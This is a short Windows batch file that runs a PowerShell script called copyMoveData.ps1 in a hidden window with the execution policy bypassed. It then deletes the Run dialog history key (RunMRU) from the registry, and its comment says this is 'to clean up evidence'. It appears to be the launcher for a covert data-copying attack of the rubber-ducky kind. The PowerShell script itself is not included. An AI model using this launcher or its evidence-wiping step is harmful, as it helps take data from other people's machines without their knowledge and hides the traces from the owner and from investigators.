@echo off

Rem run powershell script with bypass,nologo, and hidden flag
Start "" powershell.exe -ExecutionPolicy Bypass -nologo -WindowStyle Hidden -File %~dp0\copyMoveData.ps1

REM Delete registry key storing Run dialog history...to clean up evidence
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f

@cls
@exit